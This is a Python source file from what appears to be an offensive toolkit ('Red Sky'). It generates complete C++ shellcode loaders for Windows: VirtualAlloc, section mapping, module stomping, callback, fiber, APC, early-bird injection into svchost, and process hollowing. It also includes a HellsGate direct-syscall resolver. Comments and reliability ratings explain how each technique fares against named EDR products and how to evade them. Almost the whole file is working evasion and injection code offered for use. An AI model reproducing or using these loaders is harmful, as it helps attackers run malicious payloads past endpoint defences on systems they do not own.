# language: Python, file: Program/evasion/loader.py, target: Red Sky evasion — shellcode loader generator
# Emits C++ source for shellcode loaders across many execution techniques.
# Each template is complete and runnable — compile with MSVC x64.
# Techniques:
#   VirtualAlloc    -- classic, noisy, good baseline
#   NtMapView       -- section object mapping
#   ModuleStomp     -- overwrite a signed DLL's .text
#   Callback        -- EnumFonts / CertEnumSystemStore / EnumChildWindows
#   Fiber           -- ConvertThreadToFiber + CreateFiber
#   APC             -- QueueUserAPC into a suspended thread
#   EarlyBird      -- NtCreateUserProcess + NtQueueApcThread (suspended spawn)
#   Hollow          -- process hollowing template
#   HellsGate       -- direct syscall resolver included in each as an option
# Each template gets per-technique detection notes as comments.

import json
import sys
import time
from pathlib import Path
from typing import Dict, List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


EV_DIR = OUTPUT_DIR / "evasion"
LOADER_DIR = EV_DIR / "loaders"
LOADER_DIR.mkdir(parents=True, exist_ok=True)


# ── helper: HellsGate stub resolver embedded in every loader ──
HELLSGATE_HDR = r'''// hellsgate.hpp — resolve SSNs from ntdll exports, build indirect stubs.
#pragma once
#include <Windows.h>
#include <cstdint>
#include <cstring>
#include <unordered_map>

namespace hg {

struct Stub { DWORD ssn; void* gadget; };

inline std::unordered_map<std::string, Stub>& tbl() {
    static std::unordered_map<std::string, Stub> t;
    return t;
}

// find syscall; ret gadget in ntdll's .text
inline void* find_gadget() {
    auto base = (BYTE*)GetModuleHandleA("ntdll.dll");
    auto dos  = (IMAGE_DOS_HEADER*)base;
    auto nt   = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    auto sec  = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;
        BYTE* s = base + sec->VirtualAddress;
        BYTE* e = s + sec->Misc.VirtualSize;
        for (BYTE* p = s; p + 2 < e; ++p)
            if (p[0]==0x0F && p[1]==0x05 && p[2]==0xC3) return p;
    }
    return nullptr;
}

// scan stubs: 4C 8B D1 B8 <ssn>
inline DWORD resolve_ssn(const char* fn) {
    auto base = (BYTE*)GetModuleHandleA("ntdll.dll");
    auto dos  = (IMAGE_DOS_HEADER*)base;
    auto nt   = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    auto exp  = (IMAGE_EXPORT_DIRECTORY*)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    auto names = (DWORD*)(base + exp->AddressOfNames);
    auto funcs = (DWORD*)(base + exp->AddressOfFunctions);
    auto ords  = (WORD*) (base + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* n = (const char*)(base + names[i]);
        if (strcmp(n, fn) != 0) continue;
        BYTE* stub = base + funcs[ords[i]];
        for (int j = 0; j < 32; ++j)
            if (stub[j] == 0xB8) return *(DWORD*)(stub+j+1);
    }
    return 0xFFFFFFFF;
}

// build: 4C 8B D1  B8 <ssn>  FF 25 00 00 00 00  <gadget>
inline void* build_stub(DWORD ssn, void* gadget) {
    BYTE* mem = (BYTE*)VirtualAlloc(nullptr, 32, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    BYTE code[] = {
        0x4C, 0x8B, 0xD1,
        0xB8, 0, 0, 0, 0,
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,
        0,0,0,0,0,0,0,0
    };
    *(DWORD*)(code + 4) = ssn;
    *(void**)(code + 16) = gadget;
    memcpy(mem, code, sizeof(code));
    return mem;
}

inline void* get(const char* name) {
    auto& t = tbl();
    auto it = t.find(name);
    if (it == t.end()) {
        DWORD ssn = resolve_ssn(name);
        if (ssn == 0xFFFFFFFF) return nullptr;
        void* g = find_gadget();
        if (!g) return nullptr;
        t[name] = { ssn, g };
        it = t.find(name);
    }
    static std::unordered_map<std::string, void*> cache;
    auto c = cache.find(name);
    if (c != cache.end()) return c->second;
    void* s = build_stub(it->second.ssn, it->second.gadget);
    cache[name] = s;
    return s;
}

} // namespace hg
'''


# ── template: VirtualAlloc + CreateThread ──
T_VIRTUALALLOC = r'''// language: C++, file: loader_va.cpp, target: Windows x64 MSVC
// Technique: VirtualAlloc RWX -> memcpy -> CreateThread
// Detection: userland hooks on VirtualAlloc/NtAllocateVirtualMemory, thread creation
//            with a start address not backed by a module (MDE, Cortex flag this).
// Best for: lab use, or combined with the API unhooking step from av_bypass.
#include <Windows.h>
#include <cstdio>

unsigned char shellcode[] = { /* SHELLCODE */ };

int main() {
    LPVOID mem = VirtualAlloc(nullptr, sizeof(shellcode),
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return 1;
    memcpy(mem, shellcode, sizeof(shellcode));
    HANDLE th = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
    if (!th) return 1;
    WaitForSingleObject(th, INFINITE);
    return 0;
}
'''


# ── template: NtMapViewOfSection ──
T_NTMAP = r'''// language: C++, file: loader_ntmap.cpp, target: Windows x64 MSVC
// Technique: create a section object, map it as RW then RX (2 views, one for
//            write, one for execute), copy shellcode into the RW view, execute
//            via the RX view.
// Detection: section creation + memory protection transitions (EDR watches for
//            RW->RX across the same region). Split views mitigate.
#include <Windows.h>
#include <winternl.h>
#include <cstdio>

#pragma comment(lib, "ntdll.lib")

unsigned char shellcode[] = { /* SHELLCODE */ };

typedef NTSTATUS(NTAPI* pNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

int main() {
    auto pCreate  = (pNtCreateSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection");
    auto pMapView = (pNtMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection");

    LARGE_INTEGER size; size.QuadPart = sizeof(shellcode);
    HANDLE hSection = nullptr;
    if (pCreate(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
                nullptr, &size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr) != 0) return 1;

    PVOID rwView = nullptr; SIZE_T viewSize = 0;
    pMapView(hSection, GetCurrentProcess(), &rwView, 0, 0, nullptr, &viewSize, 1, 0, PAGE_READWRITE);
    memcpy(rwView, shellcode, sizeof(shellcode));

    PVOID rxView = nullptr;
    pMapView(hSection, GetCurrentProcess(), &rxView, 0, 0, nullptr, &viewSize, 1, 0, PAGE_EXECUTE_READ);
    ((void(*)())rxView)();
    return 0;
}
'''


# ── template: module stomping ──
T_MODSTOMP = r'''// language: C++, file: loader_stomp.cpp, target: Windows x64 MSVC
// Technique: load a signed, benign DLL (e.g. amsi.dll, xpsservices.dll,
//            msftedit.dll), overwrite its .text section with shellcode, then
//            execute from the module's address range. EDR sees the shellcode
//            backing a signed module -> often trusted.
// Detection: MDE and Cortex verify in-memory code against the on-disk signed
//            copy; stomping triggers a mismatch alert. Combine with a small
//            delay and non-obvious target DLL.
#include <Windows.h>
#include <cstdio>

unsigned char shellcode[] = { /* SHELLCODE */ };

int main() {
    // pick a benign, signed DLL that's not usually loaded
    HMODULE mod = LoadLibraryA("msftedit.dll");
    if (!mod) return 1;

    // find a writable code cave — the .text of this DLL is large enough
    auto dos = (IMAGE_DOS_HEADER*)mod;
    auto nt  = (IMAGE_NT_HEADERS*)((BYTE*)mod + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);
    PBYTE target = nullptr;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            target = (PBYTE)mod + sec->VirtualAddress;
            break;
        }
    }
    if (!target) return 1;

    DWORD old;
    VirtualProtect(target, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &old);
    memcpy(target, shellcode, sizeof(shellcode));
    VirtualProtect(target, sizeof(shellcode), old, &old);

    ((void(*)())target)();
    return 0;
}
'''


# ── template: callback exec ──
T_CALLBACK = r'''// language: C++, file: loader_callback.cpp, target: Windows x64 MSVC
// Technique: hand shellcode to a Windows API that takes a function pointer.
//            The OS calls it for you from deep in signed code (gdi32, crypt32,
//            user32, etc.) -> the calling thread's stack return address lands
//            in a signed module. EDR has to hook the specific API to see it.
// APIs used: EnumFontsA, EnumChildWindows, EnumDateFormatsA, CertEnumSystemStore,
//            EnumSystemLocalesA, EnumDesktopWindows.
#include <Windows.h>
#include <cstdio>

unsigned char shellcode[] = { /* SHELLCODE */ };

int main() {
    LPVOID mem = VirtualAlloc(nullptr, sizeof(shellcode),
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return 1;
    memcpy(mem, shellcode, sizeof(shellcode));
    DWORD old;
    VirtualProtect(mem, sizeof(shellcode), PAGE_EXECUTE_READ, &old);

    // EnumFontsA takes a FONTENUMPROCA callback -> our shellcode
    EnumFontsA(GetDC(nullptr), nullptr, (FONTENUMPROCA)mem, 0);
    return 0;
}
'''


# ── template: fiber ──
T_FIBER = r'''// language: C++, file: loader_fiber.cpp, target: Windows x64 MSVC
// Technique: convert the current thread to a fiber, create a new fiber whose
//            entry point is the shellcode, switch to it. Fibers are less
//            monitored than threads (fewer EDR hooks on CreateFiber).
#include <Windows.h>
#include <cstdio>

unsigned char shellcode[] = { /* SHELLCODE */ };

int main() {
    LPVOID mem = VirtualAlloc(nullptr, sizeof(shellcode),
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return 1;
    memcpy(mem, shellcode, sizeof(shellcode));

    PVOID mainFiber = ConvertThreadToFiber(nullptr);
    if (!mainFiber) return 1;
    PVOID payloadFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)mem, nullptr);
    if (!payloadFiber) return 1;
    SwitchToFiber(payloadFiber);
    return 0;
}
'''


# ── template: APC ──
T_APC = r'''// language: C++, file: loader_apc.cpp, target: Windows x64 MSVC
// Technique: allocate shellcode RWX, find a thread in the current process in
//            an alertable wait state, QueueUserAPC its start address. Shellcode
//            runs when the thread next enters an alertable state.
// Detection: QueueUserAPC hooks, thread state inspection.
#include <Windows.h>
#include <tlhelp32.h>
#include <cstdio>

unsigned char shellcode[] = { /* SHELLCODE */ };

int main() {
    LPVOID mem = VirtualAlloc(nullptr, sizeof(shellcode),
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return 1;
    memcpy(mem, shellcode, sizeof(shellcode));

    DWORD pid = GetCurrentProcessId();
    DWORD tid = GetCurrentThreadId();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te{ sizeof(te) };
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid && te.th32ThreadID != tid) {
                HANDLE th = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
                                       FALSE, te.th32ThreadID);
                if (th) {
                    QueueUserAPC((PAPCFUNC)mem, th, 0);
                    CloseHandle(th);
                }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    // give the APC a chance to fire
    Sleep(2000);
    return 0;
}
'''


# ── template: early bird ──
T_EARLYBIRD = r'''// language: C++, file: loader_earlybird.cpp, target: Windows x64 MSVC
// Technique: create a process SUSPENDED, allocate + write shellcode into it,
//            QueueUserAPC its entry, then resume. Code runs before the main
//            image fully initializes -> misses some EDR userland hooks that
//            install later.
// Detection: process creation with CREATE_SUSPENDED + early APC queue.
#include <Windows.h>
#include <cstdio>

unsigned char shellcode[] = { /* SHELLCODE */ };

int main() {
    STARTUPINFOA si{ sizeof(si) };
    PROCESS_INFORMATION pi{};
    if (!CreateProcessA(nullptr, (LPSTR)"C:\\Windows\\System32\\svchost.exe",
                        nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr,
                        nullptr, &si, &pi)) return 1;

    LPVOID mem = VirtualAllocEx(pi.hProcess, nullptr, sizeof(shellcode),
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return 1;
    WriteProcessMemory(pi.hProcess, mem, shellcode, sizeof(shellcode), nullptr);
    QueueUserAPC((PAPCFUNC)mem, pi.hThread, 0);
    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);
    return 0;
}
'''


# ── template: process hollowing ──
T_HOLLOW = r'''// language: C++, file: loader_hollow.cpp, target: Windows x64 MSVC
// Technique: create a process suspended, unmap its original image from memory,
//            write a new PE image (or raw shellcode) at its base, fix up the
//            entry point, resume. Process looks legitimate from the outside.
// Detection: NtUnmapViewOfSection on a remote process, image mismatch between
//            disk and memory.
#include <Windows.h>
#include <winternl.h>
#include <cstdio>

#pragma comment(lib, "ntdll.lib")

unsigned char shellcode[] = { /* SHELLCODE */ };

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

int main() {
    auto pUnmap = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");
    auto pQuery = (pNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");

    STARTUPINFOA si{ sizeof(si) };
    PROCESS_INFORMATION pi{};
    if (!CreateProcessA(nullptr, (LPSTR)"C:\\Windows\\System32\\svchost.exe",
                        nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr,
                        nullptr, &si, &pi)) return 1;

    PROCESS_BASIC_INFORMATION pbi{};
    pQuery(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
    PVOID imageBase = nullptr;
    ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &imageBase, sizeof(imageBase), nullptr);

    pUnmap(pi.hProcess, imageBase);
    LPVOID mem = VirtualAllocEx(pi.hProcess, imageBase, sizeof(shellcode),
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, mem, shellcode, sizeof(shellcode), nullptr);

    // fix entry point — a full implementation parses the new PE; raw shellcode
    // means we jump straight at the alloc base.
    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rip = (DWORD64)mem;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    return 0;
}
'''


TEMPLATES: Dict[str, Dict] = {
    "virtualalloc": {
        "name": "VirtualAlloc + CreateThread",
        "file": "loader_va.cpp",
        "code": T_VIRTUALALLOC,
        "detection": "Hooks on VirtualAlloc / NtAllocateVirtualMemory; thread start address not backed by a module.",
        "reliability": "low — baseline, catches on every modern EDR",
    },
    "ntmap": {
        "name": "NtMapViewOfSection",
        "file": "loader_ntmap.cpp",
        "code": T_NTMAP,
        "detection": "Section creation + memory protection transitions on the same region.",
        "reliability": "medium — split RW/RX views mitigate some detections",
    },
    "modstomp": {
        "name": "Module stomping",
        "file": "loader_stomp.cpp",
        "code": T_MODSTOMP,
        "detection": "In-memory code vs on-disk signed copy mismatch.",
        "reliability": "medium-high — defeats naive scanners, MDE/Cortex can still catch",
    },
    "callback": {
        "name": "Callback execution",
        "file": "loader_callback.cpp",
        "code": T_CALLBACK,
        "detection": "Hooks on the specific callback APIs (EnumFontsA et al).",
        "reliability": "medium — works if the specific API isn't hooked",
    },
    "fiber": {
        "name": "Fiber exec",
        "file": "loader_fiber.cpp",
        "code": T_FIBER,
        "detection": "Rarely hooked — CreateFiber + SwitchToFiber are less monitored.",
        "reliability": "medium-high on most EDR, weak if the EDR is thorough",
    },
    "apc": {
        "name": "APC injection",
        "file": "loader_apc.cpp",
        "code": T_APC,
        "detection": "QueueUserAPC hooks, thread state inspection.",
        "reliability": "low-medium — very common, hooked",
    },
    "earlybird": {
        "name": "Early bird",
        "file": "loader_earlybird.cpp",
        "code": T_EARLYBIRD,
        "detection": "CreateProcess suspended + early APC queue.",
        "reliability": "medium — beats late-installing hooks",
    },
    "hollow": {
        "name": "Process hollowing",
        "file": "loader_hollow.cpp",
        "code": T_HOLLOW,
        "detection": "NtUnmapViewOfSection on remote process; disk/memory mismatch.",
        "reliability": "low-medium — well documented and hooked",
    },
}


def _hex_array(shellcode_hex: str, width: int = 16) -> str:
    b = bytes.fromhex(shellcode_hex.strip().replace(" ", ""))
    lines = []
    for i in range(0, len(b), width):
        chunk = b[i:i+width]
        lines.append("    " + ", ".join("0x{:02x}".format(x) for x in chunk) + ",")
    return "\n".join(lines)


def cmd_list() -> int:
    print_info(str(len(TEMPLATES)) + " loader techniques")
    print()
    for key, t in TEMPLATES.items():
        print("  " + SCARLET + "*" + RESET + " " + BONE + key.ljust(14) + RESET
              + " " + ARTERY + t["name"].ljust(28) + RESET
              + " " + CLOT + t["reliability"] + RESET)
    return 0


def cmd_gen(technique: str, shellcode_hex: str, out_path: str, with_hg: bool) -> int:
    if technique not in TEMPLATES:
        print_err("unknown technique: " + technique)
        print_info("available: " + ", ".join(TEMPLATES.keys()))
        return 2

    if not shellcode_hex:
        shellcode_hex = "90" * 32  # 32 NOPs as placeholder

    try:
        arr = _hex_array(shellcode_hex)
    except ValueError:
        print_err("shellcode must be hex, no spaces needed")
        return 2

    t = TEMPLATES[technique]
    code = t["code"].replace("/* SHELLCODE */", "\n" + arr + "\n")

    if out_path:
        out = Path(out_path)
    else:
        out = LOADER_DIR / t["file"]
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(code)

    # also write hellsgate.hpp if requested
    if with_hg:
        hg = out.parent / "hellsgate.hpp"
        hg.write_text(HELLSGATE_HDR)
        print_ok("wrote " + str(hg))

    print_ok("wrote " + str(out))
    print_kv("technique", t["name"])
    print_kv("detection", t["detection"])
    print_kv("reliability", t["reliability"])
    print_kv("shellcode bytes", str(len(bytes.fromhex(shellcode_hex.replace(' ','')))))
    print()
    print_info("compile with:")
    print("  cl /std:c++20 /EHsc /O2 /Fe:" + out.stem + ".exe " + out.name + " /link ntdll.lib")
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky evasion loader", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="list", choices=["list", "gen"])
    p.add_argument("technique", nargs="?", default="")
    p.add_argument("--shellcode", default="", help="hex string of the shellcode")
    p.add_argument("--out", default="")
    p.add_argument("--with-hellsgate", action="store_true")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky evasion loader <list|gen> [technique] [--shellcode HEX] [--out file.cpp]")
        return 2

    if ns.help:
        print_info("list                     -- show techniques")
        print_info("gen modstomp --shellcode fc4883e4f0... --out /tmp/l.cpp")
        print_info("  no --shellcode given = 32 NOPs placeholder")
        print_info("  --with-hellsgate also drops hellsgate.hpp beside the loader")
        return 0

    if ns.action == "list":
        return cmd_list()
    return cmd_gen(ns.technique, ns.shellcode, ns.out, ns.with_hellsgate)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
